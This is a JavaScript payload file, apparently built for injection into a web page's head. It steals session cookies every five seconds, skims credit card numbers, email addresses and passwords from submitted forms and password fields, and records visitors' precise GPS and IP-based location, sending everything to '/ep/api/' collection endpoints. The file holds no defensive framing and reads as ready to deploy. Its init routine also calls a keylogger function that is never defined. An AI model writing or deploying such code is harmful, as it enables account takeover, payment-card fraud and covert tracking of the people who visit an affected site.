/*
REMEMBER! 
This file is run in the head tag, so make sure that your payloads are run after the body has loaded, if neceessary.
*/

console.log('%c[✓] Payload initialized', 'color: #4CAF50');

const PayloadManager = {
    init: function() {
        console.log('[PayloadManager] Initializing...');
        
        // Initialize all payloads
        this.initCookieStealer();
        this.initKeylogger();
        this.initFormStealer();
        this.initGeolocation();
        
        console.log('[PayloadManager] All payloads initialized');
    },

    initCookieStealer: function() {
        // Initial cookie capture
        this.captureCookies();
        
        // Set up cookie change listener
        document.addEventListener('cookie', this.captureCookies);
        
        // Periodic cookie check
        setInterval(() => this.captureCookies(), 5000);
    },

    captureCookies: function() {
        const cookies = document.cookie.split(';').map(cookie => {
            const [name, value] = cookie.trim().split('=');
            return {
                name: name,
                value: value,
                domain: window.location.hostname,
                path: window.location.pathname
            };
        }).filter(cookie => cookie.name && cookie.value);

        if (cookies.length > 0) {
            fetch('/ep/api/cookies', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                credentials: 'include',
                body: JSON.stringify({
                    cookies: cookies,
                    url: window.location.href,
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString()
                })
            }).catch(console.error);
        }
    },

    initFormStealer: function() {
        document.querySelectorAll('form').forEach(form => {
            form.addEventListener('submit', async (e) => {
                const formData = new FormData(form);
                const data = {};
                
                for (let [key, value] of formData.entries()) {
                    data[key] = value;
                    
                    // Check for sensitive data
                    if (this.isCreditCard(value)) {
                        this.sendSensitiveData('credit_card', value);
                    }
                    if (this.isEmail(value)) {
                        this.sendSensitiveData('email', value);
                    }
                    if (key.toLowerCase().includes('pass')) {
                        this.sendSensitiveData('password', value);
                    }
                }
            });
        });

        // Monitor password fields
        document.querySelectorAll('input[type="password"]').forEach(input => {
            input.addEventListener('change', (e) => {
                this.sendSensitiveData('password', e.target.value);
            });
        });
    },

    initGeolocation: function() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const geoData = {
                        lat: position.coords.latitude,
                        lon: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: new Date().toISOString(),
                        url: window.location.href,
                        userAgent: navigator.userAgent
                    };

                    fetch('/ep/api/geolocation', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(geoData)
                    }).catch(console.error);
                },
                (error) => console.error('Geolocation error:', error),
                { enableHighAccuracy: true }
            );
        }

        // Also collect IP-based location
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                fetch('/ep/api/geolocation', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        ...data,
                        source: 'ip',
                        timestamp: new Date().toISOString(),
                        url: window.location.href
                    })
                }).catch(console.error);
            })
            .catch(console.error);
    },

    sendSensitiveData: function(type, value) {
        fetch('/ep/api/sensitive', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                type: type,
                value: value,
                url: window.location.href,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent
            })
        }).catch(console.error);
    },

    isCreditCard: function(str) {
        const ccRegex = /^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:2131|1800|35\d{3})\d{11})$/;
        return ccRegex.test(str.replace(/\s/g, ''));
    },

    isEmail: function(str) {
        const emailRegex = /^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$/;
        return emailRegex.test(str);
    }
};

// Initialize when DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => PayloadManager.init());
} else {
    PayloadManager.init();
}

// Notify that payload is loaded
console.log('Payload initialized successfully');